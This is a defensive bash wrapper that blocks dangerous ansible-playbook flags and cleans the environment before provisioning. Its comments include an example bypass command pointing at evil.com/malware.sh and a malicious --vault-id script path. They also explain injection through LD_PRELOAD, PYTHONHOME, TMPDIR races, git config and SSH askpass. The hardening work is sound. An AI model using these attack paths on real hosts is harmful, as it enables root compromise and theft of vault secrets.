#!/usr/bin/env bash
# SECURITY: Reject --start-at-task flag and other dangerous ansible-playbook flags
# to prevent bypassing pre-flight validation checks.
#
# Vulnerability: Ansible's --start-at-task skips pre_tasks (even with tags: [always]),
# allowing an attacker to bypass validation by running:
#   ansible-playbook site.yml --start-at-task '<task-name>' -e 'claude_install_url=https://evil.com/malware.sh'
#
# Defense-in-depth layers:
#   1. Makefile VERIFY_AND_RUN calls this script (Makefile layer — blocks direct users)
#   2. Arg scanner — rejects --start-at-task, --skip-tags=always, _pf_vault_asserted, csb_rhel/_csb_molecule_force overrides (this script)
#   3. site.yml Play 0 has tags: [always] with pre-flight checks (Ansible layer)
#   4. site.yml Play 2 re-runs pre-flight checks (Ansible layer — survives --skip-tags always)
#   5. Each role's tasks/main.yml has a tags: [always] defense-in-depth assertion (role layer)
#   6. ENV sanitization — pins/clears 50+ vars: ANSIBLE_*, LD_*, PYTHON*, GIT_*, Go, Sigstore, socket/temp (env-injection layer)
#   7. HOME hijack check — validates HOME matches /etc/passwd before any path operations
#   8. verify-collections.sh — supply-chain integrity check before exec

set -euo pipefail

# Collect all command-line arguments after the script name
args=("$@")

# Reject specific dangerous flags only
# NOTE: --tags and --skip-tags are NOT blocked globally — they're needed for role-specific
# make targets (make claude, make system, etc.). Only --start-at-task and --skip-tags always
# are blocked, as they specifically bypass pre-flight security checks.
for arg in "${args[@]}"; do
    # Block --start-at-task: skips pre_tasks entirely, bypassing all Play 0 security checks
    if [[ "$arg" == '--start-at-task' || "$arg" == --start-at-task=* || "$arg" == '--start-task' ]]; then
        cat >&2 <<EOF
ERROR: --start-at-task rejected by VERIFY_AND_RUN
Reason: --start-at-task skips pre_tasks (even with tags: [always] on Play 0),
        allowing bypass of ALL security assertions in pre_flight_checks.yml.

SECURITY RISK: Enables attacker to inject malicious values via -e without validation.
Solution: Use a scoped make target instead (make claude, make packages, make ssh, etc.)
EOF
        exit 1
    fi
    # Block --vault-password-file (single-arg = form)
    # ANSIBLE_VAULT_PASSWORD_FILE is already pinned; a CLI-supplied --vault-password-file
    # adds a second vault source and executes the named script as the invoking user before
    # the first task runs. No legitimate caller needs this flag.
    if [[ "$arg" == --vault-password-file=* ]]; then
        cat >&2 <<EOF
ERROR: --vault-password-file rejected by VERIFY_AND_RUN
Reason: ANSIBLE_VAULT_PASSWORD_FILE is already pinned to scripts/vault-pass.sh.
        A CLI-supplied --vault-password-file executes an additional script as the
        invoking user before any task runs, bypassing vault source controls.
SECURITY RISK: Arbitrary code execution via attacker-controlled vault password script.
Solution: Do not pass --vault-password-file on the command line.
EOF
        exit 1
    fi
    # Block --vault-id: Ansible 2.8+ vault-id unification executes the vault-id source
    # (e.g. --vault-id=attacker@/tmp/evil.py) as a subprocess alongside vault-pass.sh,
    # achieving code execution as the invoking user before the first task runs.
    # ANSIBLE_VAULT_PASSWORD_FILE does NOT suppress CLI-supplied vault-id sources; both execute.
    if [[ "$arg" == '--vault-id' || "$arg" == --vault-id=* ]]; then
        cat >&2 <<EOF
ERROR: --vault-id rejected by VERIFY_AND_RUN
Reason: Ansible 2.8+ vault-id unification executes the vault-id source script
        alongside vault-pass.sh before any task runs. --vault-id=attacker@/tmp/evil.py
        achieves code execution as the invoking user; ANSIBLE_VAULT_PASSWORD_FILE does
        not suppress CLI-supplied vault-id sources.
Solution: Vault decryption is handled by ANSIBLE_VAULT_PASSWORD_FILE (vault-pass.sh).
          Do not supply --vault-id on the command line.
EOF
        exit 1
    fi
    # Block --skip-tags=always (single-arg form with =); also block --skip-tags=always,<extra>
    if [[ "$arg" == '--skip-tags=always' || "$arg" == '--skip-tags=always,'* ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags=always rejected by VERIFY_AND_RUN
Reason: --skip-tags=always bypasses Play 2's [always]-tagged pre_tasks (vault
        healthcheck, CSB re-detection, identity assertions); Play 0 tasks are
        untagged and are NOT skipped by --skip-tags=always.
Solution: Do not use --skip-tags always with site.yml.
         Use a scoped make target instead (make claude, make packages, make ssh, etc.).
EOF
        exit 1
    fi
    # Block -e @file / --extra-vars=@file (single-arg =value and no-space forms)
    # Ansible's @file extra-vars syntax loads arbitrary YAML from the named file, bypassing
    # all per-variable checks below (a file can set _pf_vault_asserted, csb_rhel,
    # common_project_root, etc. in one flag). All legitimate callers pass key=value pairs.
    if [[ "$arg" == --extra-vars=@* || "$arg" == -e@* ]]; then
        cat >&2 <<EOF
ERROR: @file extra-vars rejected by VERIFY_AND_RUN
Reason: Ansible's @file syntax loads arbitrary YAML from a file, bypassing all
        per-variable guards (csb_rhel, _pf_vault_asserted, common_project_root,
        system_sysctl_hardening, etc.) in a single flag.
Solution: Pass key=value pairs directly instead of using a @file reference.
EOF
        exit 1
    fi
    # Block -e _pf_is_molecule=* / --extra-vars=_pf_is_molecule=* (single-arg =value form)
    # extra-vars (precedence 22) beats set_fact (18); pre-defining _pf_is_molecule=true
    # forces the flag permanently true, bypassing all 7 `when: not _pf_is_molecule` guards
    # in pre_flight_checks.yml for the entire play (vault checks, SSTI guard, URL validation).
    if [[ "$arg" == --extra-vars=_pf_is_molecule=* || "$arg" == -e_pf_is_molecule=* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_is_molecule rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_is_molecule via extra-vars (precedence 22) overrides the
        set_fact (precedence 18) that derives it from the environment, permanently
        forcing it true and bypassing all 7 pre_flight_checks.yml security assertions.
Solution: Do not pass _pf_is_molecule as an extra-var.
EOF
        exit 1
    fi
    # Block -e _pf_vault_asserted=* / --extra-vars=_pf_vault_asserted=* (single-arg =value form)
    # Passing this via extra-vars (precedence 22) would pre-define the flag that gates the
    # vault_*/secret-key/security-policy assertions in pre_flight_checks.yml, silently skipping
    # all four checks and allowing vault_* keys in config.yml to shadow vault.yml undetected.
    if [[ "$arg" == --extra-vars=_pf_vault_asserted=* || "$arg" == -e_pf_vault_asserted=* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_vault_asserted rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_vault_asserted via extra-vars bypasses vault_* key detection,
        secret-key shadowing checks, claude security-policy checks, and the
        redhat_splunk_nologin_shell assertion in pre_flight_checks.yml.
Solution: Do not pass _pf_vault_asserted as an extra-var.
EOF
        exit 1
    fi
    # Block --extra-vars=csb_rhel=* and --extra-vars=_csb_molecule_force=* (single-arg = form)
    # extra-vars precedence 22 beats set_fact precedence 18; injecting these facts bypasses CSB
    # classification and silently skips hardening tasks (sysctl, cron, authselect, chrony, etc.)
    if [[ "$arg" == --extra-vars=csb_rhel=* || "$arg" == --extra-vars=_csb_molecule_force=* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=csb_rhel= or --extra-vars=_csb_molecule_force= rejected by VERIFY_AND_RUN
Reason: these facts gate CSB/RHEL classification; injecting via --extra-vars silently
        disables hardening tasks (sysctl, cron, authselect, firmware, chrony) on Fedora.
SECURITY RISK: Misclassifies the host as RHEL CSB, bypassing the OS hardening stack.
Solution: Do not override csb_rhel or _csb_molecule_force on the command line.
EOF
        exit 1
    fi
    # Block any --extra-vars containing system_sysctl_hardening (key=value or JSON dict form)
    # extra-vars (precedence 22) beats set_fact (18); injecting system_sysctl_hardening replaces
    # the role-default hardening dict before the merge set_fact runs, AND remains authoritative
    # after it (22 > 18), so the deployed 90-hardening.conf silently drops all static entries.
    if [[ "$arg" == --extra-vars=*system_sysctl_hardening* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=system_sysctl_hardening rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) overrides the role-default hardening dict and beats
        set_fact (18); the deployed /etc/sysctl.d/90-hardening.conf would contain only
        the injected keys, silently dropping kptr_restrict, dmesg_restrict, tcp_syncookies,
        and all other static hardening entries.
SECURITY RISK: Full erasure of sysctl hardening baseline on the provisioned host.
Solution: Do not override system_sysctl_hardening on the command line.
EOF
        exit 1
    fi
    # Block any --extra-vars containing common_project_root (key=value or JSON dict form)
    # extra-vars (precedence 22) beats set_fact (18); injecting common_project_root redirects
    # every include_tasks: "{{ common_project_root }}/..." to attacker-controlled task files,
    # silently bypassing SSTI guards, vault_* assertions, URL validation, and CSB classification.
    if [[ "$arg" == --extra-vars=*common_project_root* || "$arg" == -e*common_project_root* ]]; then
        cat >&2 <<EOF
ERROR: --extra-vars=common_project_root rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) override set_fact (18) and redirect all
        include_tasks: "{{ common_project_root }}/..." security checks to attacker-
        controlled task files, bypassing SSTI guards, vault_* key assertions, URL
        validation, and CSB classification across Play 0, Play 1, and Play 2.
SECURITY RISK: Empty YAML at attacker path silently passes all pre-flight checks.
Solution: Do not override common_project_root on the command line.
EOF
        exit 1
    fi
done

# Check for space-separated two-arg forms: --skip-tags always, -e _pf_vault_asserted=*, --extra-vars _pf_vault_asserted=*
# This requires scanning consecutive arg pairs since the loop above only sees individual args.
for ((i=0; i<${#args[@]}-1; i++)); do
    # Block space-separated: --vault-password-file /tmp/evil.py
    if [[ "${args[$i]}" == '--vault-password-file' ]]; then
        cat >&2 <<EOF
ERROR: --vault-password-file rejected by VERIFY_AND_RUN
Reason: ANSIBLE_VAULT_PASSWORD_FILE is already pinned to scripts/vault-pass.sh.
        A CLI-supplied --vault-password-file executes an additional script as the
        invoking user before any task runs, bypassing vault source controls.
SECURITY RISK: Arbitrary code execution via attacker-controlled vault password script.
Solution: Do not pass --vault-password-file on the command line.
EOF
        exit 1
    fi
    if [[ "${args[$i]}" == '--skip-tags' && ( "${args[$((i+1))]}" == 'always' || "${args[$((i+1))]}" == 'always,'* ) ]]; then
        cat >&2 <<EOF
ERROR: --skip-tags always rejected by VERIFY_AND_RUN
Reason: --skip-tags always bypasses Play 2's [always]-tagged pre_tasks (vault
        healthcheck, CSB re-detection, identity assertions); Play 0 tasks are
        untagged and are NOT skipped by --skip-tags=always.
Solution: Do not use --skip-tags always with site.yml.
         Use a scoped make target instead (make claude, make packages, make ssh, etc.).
EOF
        exit 1
    fi
    # Block space-separated two-arg --vault-id form: --vault-id attacker@/tmp/evil.py
    if [[ "${args[$i]}" == '--vault-id' ]]; then
        cat >&2 <<EOF
ERROR: --vault-id rejected by VERIFY_AND_RUN
Reason: Ansible 2.8+ vault-id unification executes the vault-id source script
        alongside vault-pass.sh before any task runs. --vault-id attacker@/tmp/evil.py
        achieves code execution as the invoking user; ANSIBLE_VAULT_PASSWORD_FILE does
        not suppress CLI-supplied vault-id sources.
Solution: Vault decryption is handled by ANSIBLE_VAULT_PASSWORD_FILE (vault-pass.sh).
          Do not supply --vault-id on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e @file and --extra-vars @file
    # @file loads arbitrary YAML, bypassing all per-variable guards in one flag.
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == @* ]]; then
        cat >&2 <<EOF
ERROR: @file extra-vars rejected by VERIFY_AND_RUN
Reason: Ansible's @file syntax loads arbitrary YAML from a file, bypassing all
        per-variable guards (csb_rhel, _pf_vault_asserted, common_project_root,
        system_sysctl_hardening, etc.) in a single flag.
Solution: Pass key=value pairs directly instead of using a @file reference.
EOF
        exit 1
    fi
    # Block space-separated: -e _pf_is_molecule=<value> and --extra-vars _pf_is_molecule=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == _pf_is_molecule=* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_is_molecule rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_is_molecule via extra-vars (precedence 22) overrides the
        set_fact (precedence 18) that derives it from the environment, permanently
        forcing it true and bypassing all 7 pre_flight_checks.yml security assertions.
Solution: Do not pass _pf_is_molecule as an extra-var.
EOF
        exit 1
    fi
    # Block space-separated: -e _pf_vault_asserted=<value> and --extra-vars _pf_vault_asserted=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && "${args[$((i+1))]}" == _pf_vault_asserted=* ]]; then
        cat >&2 <<EOF
ERROR: -e _pf_vault_asserted rejected by VERIFY_AND_RUN
Reason: Pre-defining _pf_vault_asserted via extra-vars bypasses vault_* key detection,
        secret-key shadowing checks, claude security-policy checks, and the
        redhat_splunk_nologin_shell assertion in pre_flight_checks.yml.
Solution: Do not pass _pf_vault_asserted as an extra-var.
EOF
        exit 1
    fi
    # Block space-separated: -e csb_rhel=<value>, --extra-vars csb_rhel=<value>,
    # -e _csb_molecule_force=<value>, --extra-vars _csb_molecule_force=<value>
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          ( "${args[$((i+1))]}" == csb_rhel=* || "${args[$((i+1))]}" == _csb_molecule_force=* ) ]]; then
        cat >&2 <<EOF
ERROR: -e csb_rhel= or -e _csb_molecule_force= rejected by VERIFY_AND_RUN
Reason: these facts gate CSB/RHEL classification; injecting via -e silently
        disables hardening tasks (sysctl, cron, authselect, firmware, chrony) on Fedora.
SECURITY RISK: Misclassifies the host as RHEL CSB, bypassing the OS hardening stack.
Solution: Do not override csb_rhel or _csb_molecule_force on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e system_sysctl_hardening=* or JSON dict containing the key
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          "${args[$((i+1))]}" == *system_sysctl_hardening* ]]; then
        cat >&2 <<EOF
ERROR: -e system_sysctl_hardening rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) overrides the role-default hardening dict and beats
        set_fact (18); the deployed /etc/sysctl.d/90-hardening.conf would contain only
        the injected keys, silently dropping kptr_restrict, dmesg_restrict, tcp_syncookies,
        and all other static hardening entries.
SECURITY RISK: Full erasure of sysctl hardening baseline on the provisioned host.
Solution: Do not override system_sysctl_hardening on the command line.
EOF
        exit 1
    fi
    # Block space-separated: -e common_project_root=<value> or JSON dict containing the key
    if [[ ( "${args[$i]}" == '-e' || "${args[$i]}" == '--extra-vars' ) && \
          "${args[$((i+1))]}" == *common_project_root* ]]; then
        cat >&2 <<EOF
ERROR: -e common_project_root rejected by VERIFY_AND_RUN
Reason: extra-vars (precedence 22) override set_fact (18) and redirect all
        include_tasks: "{{ common_project_root }}/..." security checks to attacker-
        controlled task files, bypassing SSTI guards, vault_* key assertions, URL
        validation, and CSB classification across Play 0, Play 1, and Play 2.
SECURITY RISK: Empty YAML at attacker path silently passes all pre-flight checks.
Solution: Do not override common_project_root on the command line.
EOF
        exit 1
    fi
done

# Override or clear critical env vars to prevent environment-injection attacks.
# Key high-risk vectors (see also inline comments below for ANSIBLE_LIBRARY, ANSIBLE_FORCE_HANDLERS, ANSIBLE_BECOME_*, NSS_WRAPPER_*, TMPDIR, MOLECULE_*): — SET known-safe values; UNSET those that must be clean:
#   ANSIBLE_CONFIG              — evil cfg replaces all plugin paths + vault_password_file
#   ANSIBLE_VAULT_PASSWORD_FILE — redirects vault decryption to an exfiltration script
#   ANSIBLE_COLLECTIONS_PATH    — loads malicious collections (role 0 code execution)
#   ANSIBLE_ROLES_PATH          — loads malicious roles (arbitrary become code execution)
#   ANSIBLE_ACTION_PLUGINS      — action plugins run for every task; malicious = full intercept
#   ANSIBLE_STRATEGY_PLUGINS    — strategy plugin controls task dispatch; malicious = intercept all
#
#   PYTHONPATH                  — injected module shadows ansible.* at Python import time (CRITICAL)
#   ANSIBLE_PYTHON_INTERPRETER  — redirects Python used by Ansible to attacker binary
#
#   ANSIBLE_CACHE_PLUGIN*       — crafted facts cache plants spoofed ansible_distribution/ansible_fqdn,
#                                 skewing CSB detection (csb_detect.yml reads cached facts before gather)
#   ANSIBLE_INVENTORY           — malicious static inventory injects host_vars (e.g. ansible_python_interpreter)
#                                 that survive unset ANSIBLE_PYTHON_INTERPRETER (env ≠ host_var), executing
#                                 attacker-controlled Python as root via become tasks
#   ANSIBLE_INVENTORY_PLUGINS   — malicious inventory plugin injects host vars (e.g. ansible_python_interpreter)
#                                 that override connection defaults, executing attacker-controlled binary
#   ANSIBLE_VARS_PLUGINS        — vars plugins run before any play task at inventory/play precedence
#                                 (higher than group_vars); injects/overrides variables before
#                                 pre_flight_checks.yml runs, bypassing SSTI guards entirely
#
#   LD_PRELOAD                  — injects attacker .so into ansible-playbook Python process at exec() time;
#                                 hooks libc open()/read() to exfiltrate vault plaintext BEFORE sudo ever runs;
#                                 sudo env_reset strips it from become tasks but the user-context process
#                                 decrypts the vault first — that window is the attack surface
#   LD_LIBRARY_PATH             — redirects shared library resolution for Python + all subprocesses;
#                                 allows substituting libpython*.so or any dependency with a malicious copy
#   LD_AUDIT                    — silent rtld-audit hook (la_* interface) into every dynamic symbol call
#                                 in every process; more covert than LD_PRELOAD (no symbol replacement,
#                                 observation only) but sufficient to exfiltrate vault secrets
#
#   PYTHONHOME                  — completely replaces Python's stdlib search path before any Ansible code
#                                 runs; attacker sets PYTHONHOME=/tmp/evil, plants os.py/hashlib.py/
#                                 subprocess.py replacements — full Python interpreter redirection
#   PYTHONUSERSITE              — when "1", enables ~/.local/lib/pythonX.Y/site-packages; attacker
#                                 pre-seeds ~/.local/lib/python3.x/site-packages/ansible/ with
#                                 malicious modules that survive PYTHONPATH unset (different mechanism)
#   PYTHONSTARTUP               — executes named file before main script; CPython skips it for
#                                 non-interactive invocations (no tty), so practical risk is low,
#                                 but cleared for defence-in-depth

# SECURITY: Unset NSS_WRAPPER and linker injection vars BEFORE the getent HOME check.
# libnss_wrapper.so (invoked via LD_PRELOAD=libnss_wrapper.so NSS_WRAPPER_PASSWD=/tmp/evil)
# intercepts getent passwd and returns an attacker-controlled home directory entry, making
# HOME=/home/attacker appear valid. This poisons ANSIBLE_COLLECTIONS_PATH with an attacker
# path before exec. Unset these here so getent reads the real /etc/passwd.
# LD_PRELOAD/LD_LIBRARY_PATH/LD_AUDIT are also cleared here (early, before getent HOME check); the main sanitization block repeats this for defence-in-depth.
unset NSS_WRAPPER_PASSWD NSS_WRAPPER_GROUP
unset LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT

_repo_root="$(cd "$(dirname "$0")/.." && pwd)"

# SECURITY: Validate HOME matches /etc/passwd to prevent home directory hijacking.
# An attacker setting HOME=/home/victim causes account_hardening.yml to chmod victim's home
# as root (become: true) and routes ANSIBLE_COLLECTIONS_PATH through victim's ~/.ansible.
_invoking_user="$(id -un)"
_passwd_home=""
if command -v getent &>/dev/null; then
    _passwd_home="$(getent passwd "${_invoking_user}" 2>/dev/null | cut -d: -f6)"
elif command -v dscl &>/dev/null; then
    _passwd_home="$(dscl . -read "/Users/${_invoking_user}" NFSHomeDirectory 2>/dev/null | awk '{print $2}')"
fi
if [[ -n "${_passwd_home}" && "${HOME}" != "${_passwd_home}" ]]; then
    cat >&2 <<EOF
ERROR: HOME mismatch — possible home directory hijack attempt
  HOME env var : ${HOME}
  Expected     : ${_passwd_home} (from /etc/passwd for ${_invoking_user})
Do not set HOME to another user's directory before running make all.
EOF
    exit 1
fi
# SECURITY: Validate USER matches id -un to prevent identity injection.
# An attacker setting USER=victim causes AllowUsers victim in the sshd drop-in,
# locking out the real user mid-play. id -un is kernel-sourced (getpwuid) and
# cannot be spoofed via environment variables.
if [[ -n "${USER:-}" && "$USER" != "$_invoking_user" ]]; then
    cat >&2 <<EOF
ERROR: USER env var does not match id -un — possible identity injection
  USER env var : ${USER}
  Expected     : ${_invoking_user} (from id -un)
Do not set USER to another user's identity before running make all.
EOF
    exit 1
fi
unset _invoking_user _passwd_home

export ANSIBLE_CONFIG="${_repo_root}/ansible.cfg"
export ANSIBLE_VAULT_PASSWORD_FILE="${_repo_root}/scripts/vault-pass.sh"
export ANSIBLE_VAULT_ID_MATCH=False  # prevent ANSIBLE_VAULT_ID_MATCH=true lockout: default encryption (ansible-vault encrypt) uses @default label; if an attacker sets ID_MATCH=true and label mismatches, all vault-sourced vars (SSH keys, authorized_keys, registry tokens) fail to decrypt — post-reboot host becomes SSH-inaccessible on port 722
export ANSIBLE_COLLECTIONS_PATH="${_repo_root}/collections:${HOME}/.ansible/collections:/usr/share/ansible/collections"
export ANSIBLE_ROLES_PATH="${_repo_root}/roles:${HOME}/.ansible/roles:/etc/ansible/roles"
export ANSIBLE_INVENTORY="${_repo_root}/inventory"  # pin inventory; host_var inject bypasses ANSIBLE_PYTHON_INTERPRETER unset
export ANSIBLE_ACTION_PLUGINS="${_repo_root}/action_plugins"
export ANSIBLE_STRATEGY_PLUGINS="${_repo_root}/strategy_plugins"
export ANSIBLE_LIBRARY=""         # prevent ANSIBLE_LIBRARY=/tmp/evil hijacking short-name module resolution (runs before builtins, become: true = root)
export ANSIBLE_FILTER_PLUGINS=""  # no local filter plugins; prevent shadowing built-ins (e.g. from_yaml) via env injection
export ANSIBLE_CONNECTION_PLUGINS=""  # prevent ANSIBLE_CONNECTION_PLUGINS=/tmp/evil hijacking: PluginLoader searches user paths before builtins; malicious local.py intercepts all localhost task execution (all 13 roles, including become:true plays)
unset PYTHONPATH          # attacker-set PYTHONPATH can shadow ansible.* modules at import time
unset ANSIBLE_PYTHON_INTERPRETER  # attacker-controlled interpreter runs arbitrary code as Ansible
unset LD_PRELOAD LD_LIBRARY_PATH LD_AUDIT  # linker injection — .so hijacks user-context ansible-playbook before sudo strips it from become
unset TMPDIR TEMP TMP  # TMPDIR redirection attack: attacker sets TMPDIR=/tmp/evil; Python tempfile.gettempdir() checks TMPDIR first, so Ansible AnsiballZ module staging writes .py files into attacker-controlled dir; inotifywait race replaces module between write and sudo exec, achieving root code execution
unset PYTHONHOME PYTHONSTARTUP && export PYTHONNOUSERSITE=1  # Python runtime injection — PYTHONHOME replaces stdlib entirely; PYTHONNOUSERSITE=1 disables ~/.local site-packages (PYTHONUSERSITE is a no-op variable; PYTHONNOUSERSITE is the real CPython control); PYTHONSTARTUP low-risk for non-interactive but cleared for defence-in-depth
export ANSIBLE_INVENTORY_PLUGINS=""  # empty string forces compiled-in defaults only; prevents malicious inventory plugin from injecting host vars (e.g. ansible_python_interpreter) that bypass interpreter controls
export ANSIBLE_VARS_PLUGINS=""  # block vars plugin path hijacking — vars plugins run before any play task at higher precedence than group_vars; a malicious plugin can override claude_install_url, dotfiles_repo_url, or any config toggle before pre_flight_checks.yml executes, bypassing SSTI guards entirely
unset ANSIBLE_CACHE_PLUGIN ANSIBLE_CACHE_PLUGIN_CONNECTION ANSIBLE_CACHE_PLUGIN_TIMEOUT ANSIBLE_CACHE_PLUGIN_PREFIX  # facts-cache injection
unset ANSIBLE_FORCE_HANDLERS  # force-handlers injection: ANSIBLE_FORCE_HANDLERS=true fires ALL queued handlers at end-of-play even when the play fails mid-sequence; handlers (Restart sshd, Apply sysctl, Apply firewall rules, Remount /tmp) run as root against a partially-written config, producing a hardening-gap state
export ANSIBLE_CALLBACK_PLUGINS=""  # block callback plugin path hijacking — prevents exfiltration of slurp task results via malicious callback
export ANSIBLE_STDOUT_CALLBACK="default"  # pin stdout callback — prevents ANSIBLE_STDOUT_CALLBACK=evil_cb injecting a callback that receives all task results (vault secrets, authorized_keys, registry tokens)
unset ANSIBLE_CALLBACKS_ENABLED  # ANSIBLE_CALLBACK_PLUGINS="" only blocks legacy path-based callbacks; collection-namespaced callbacks (community.general.log_plays, community.general.syslog_json) load via ANSIBLE_COLLECTIONS_PATH which IS set — ANSIBLE_CALLBACKS_ENABLED=community.general.log_plays + ANSIBLE_LOG_FOLDER=/tmp/evil writes vault-decrypted task results to disk outside sudo's env_reset window
unset ANSIBLE_CALLBACK_WHITELIST  # pre-2.15 alias for ANSIBLE_CALLBACKS_ENABLED; some Ansible versions still honour it alongside the canonical name
unset ANSIBLE_ENABLE_TASK_DEBUGGER  # ANSIBLE_ENABLE_TASK_DEBUGGER=true drops into interactive task debugger on any failure; 'p task.args' in the debugger prints all task arguments including vault-decrypted SSH keys, registry tokens, and passwords
unset ANSIBLE_LOG_FOLDER  # log_plays output directory control — log_plays reads ANSIBLE_LOG_FOLDER (default /var/log/ansible/hosts/); without this unset an attacker sets ANSIBLE_LOG_FOLDER=/tmp/evil/ to make the log_plays callback write to an attacker-controlled writable path
unset ANSIBLE_LOG_PATH  # general Ansible run log — note: ANSIBLE_LOG_PATH is separate from ANSIBLE_LOG_FOLDER (log_plays); Ansible core reads this env var as ansible.cfg log_path; if set by an attacker, all task output (including debug output of vault-decrypted vars) is written to the specified path
export ANSIBLE_HASH_BEHAVIOUR=replace  # pin dict merge semantics — ANSIBLE_HASH_BEHAVIOUR=merge lets attacker-supplied -e dicts merge key-by-key with role-default security dicts instead of replacing them, potentially injecting keys without triggering replacement-based detection; 'replace' is the Ansible default and the only safe mode
export ANSIBLE_BECOME_FLAGS=  # strip injected become flags — ANSIBLE_BECOME_FLAGS='-l' constructs 'sudo -l -u root ...' which prints allowed commands and exits without running the play; other flags can alter sudo behavior per policy in subtle ways; the playbook requires no non-default become flags so forcing empty is safe
export ANSIBLE_BECOME_ASK_PASS=False  # prevent interactive become-password prompt — ANSIBLE_BECOME_ASK_PASS=True forces Ansible to open /dev/tty for the sudo password; in tmux sessions without a controlling tty or in CI this hangs or errors immediately, blocking all Play 1 become tasks (provisioning DoS); playbook uses vault or the invoking user's cached sudo credentials, so ask-pass is never needed
export ANSIBLE_TASK_TIMEOUT=0  # pin task timeout to disabled — ANSIBLE_TASK_TIMEOUT=1 kills every task action after 1 second; dnf install, sysctl apply, sshd restart, firewall, PAM writes, and audit rules all exceed this; each kill registers as an external failure absorbed by CSB rescue blocks, so provisioning 'completes' while sysctl hardening, sshd config, firewall rules, PAM config, and audit rules are all unapplied; mid-write truncation of files like /etc/sysctl.d/90-hardening.conf is also possible; 0 (the Ansible default) disables the timeout entirely
unset MOLECULE_PROJECT_DIRECTORY  # attacker-controlled path redirects include_tasks to bypass pre_flight_checks.yml
unset MOLECULE_SCENARIO_NAME  # prevent molecule-context bypass on real hosts
export ANSIBLE_LOOKUP_PLUGINS=""  # shadowed env plugin can forge _pf_is_molecule=true, bypassing all security assertions
unset CONTAINER_HOST DOCKER_HOST PODMAN_HOST  # prevent socket hijacking — attacker-set CONTAINER_HOST/DOCKER_HOST/PODMAN_HOST redirects podman API calls (including vault credential writes via podman login) to an attacker-controlled socket
export MOLECULE_PODMAN_EXECUTABLE=podman  # pin podman executable — molecule-podman driver reads this via os.environ.get('MOLECULE_PODMAN_EXECUTABLE', 'podman'); an attacker-set path bypasses PATH pin and routes privileged container calls (privileged:true in fedora/rocky scenarios) through an arbitrary binary
unset GIT_TEMPLATE_DIR  # prevent git template injection — attacker-set GIT_TEMPLATE_DIR=/tmp/evil copies malicious hooks into every repo cloned by git_repos role; hooks fire at clone time in user context with full SSH agent access and persist after provisioning ends
unset GIT_EXEC_PATH  # git-internal subcommand resolver — git resolves git-fetch/git-clone/git-remote via GIT_EXEC_PATH before PATH; a fake /tmp/evil/git-fetch can exfiltrate SSH agent sockets or silently patch cloned source before Ansible sees exit 0; not covered by the PATH pin below
unset GIT_SSH GIT_SSH_COMMAND  # prevent SSH binary hijack — ansible.builtin.git re-exports GIT_SSH/GIT_SSH_COMMAND verbatim (absolute path, bypasses PATH pin) as the SSH wrapper for every git clone; attacker binary inherits SSH_AUTH_SOCK and can exfiltrate credentials or MITM cloned source
unset SSH_ASKPASS SSH_ASKPASS_REQUIRE DISPLAY  # prevent askpass injection — SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+) causes ssh to invoke $SSH_ASKPASS unconditionally even without a tty, regardless of DISPLAY; an attacker-set SSH_ASKPASS=/tmp/log.sh receives any passphrase/password prompts from ssh subprocesses spawned by ansible.builtin.git (affects internal SSH git hosts configured via ssh_work_keyscan_hosts that support keyboard-interactive/password auth); DISPLAY cleared to remove the pre-8.4 fallback gating path; provisioning does not require any of these variables
unset SSH_AUTH_SOCK  # prevent agent socket proxy attack — with GIT_SSH/GIT_SSH_COMMAND cleared, git falls back to /usr/bin/ssh which reads SSH_AUTH_SOCK from the inherited environment; a pre-set SSH_AUTH_SOCK=/tmp/evil.sock proxy socket receives every signing request from all SSH-URL git clones (16+ repos + notes), enabling silent credential logging or source MITM; Ansible itself does not require SSH_AUTH_SOCK
unset GIT_CONFIG_GLOBAL GIT_CONFIG_NOSYSTEM  # attacker-controlled global git config — GIT_CONFIG_GLOBAL=/tmp/evil.gitconfig can inject url.insteadOf to silently redirect all HTTPS GitHub clones to an attacker server, or inject core.fsmonitor=/tmp/evil_script to execute arbitrary code on every git-status call (fsmonitor is separate from core.hooksPath and bypasses the hooks guard); GIT_CONFIG_NOSYSTEM, when set by an attacker, suppresses /etc/gitconfig so any system-level security settings (e.g. allowed protocols) are bypassed — unsetting it restores normal system-config reading
unset GIT_HTTP_PROXY_AUTHMETHOD  # defense-in-depth: prevents downgrade of proxy auth to basic-auth when HTTPS_PROXY is set, which would send GitHub tokens in cleartext to the proxy
unset HTTPS_PROXY HTTP_PROXY ALL_PROXY https_proxy http_proxy all_proxy  # prevent proxy interception — caller-set proxy vars pass through to ansible-playbook and every child task (binary downloads, go module fetches, git clones); a MITM proxy sees all version strings and can 502-abort selective tasks; use network_proxied in config.yml for the supported go-module proxy mechanism
unset SIGSTORE_NO_VERIFY SIGSTORE_ROOT_FILE SIGSTORE_REKOR_PUBLIC_KEY COSIGN_EXPERIMENTAL  # Sigstore/cosign trust chain — SIGSTORE_NO_VERIFY=1 skips all Rekor/Fulcio verification; SIGSTORE_ROOT_FILE=/tmp/evil.pem substitutes a malicious root CA; SIGSTORE_REKOR_PUBLIC_KEY=/tmp/evil.pub replaces Rekor's transparency log key; COSIGN_EXPERIMENTAL=1 changes verification semantics; any of these bypass cosign verify-blob trust chain for cosign self-verification and sops checksums verification
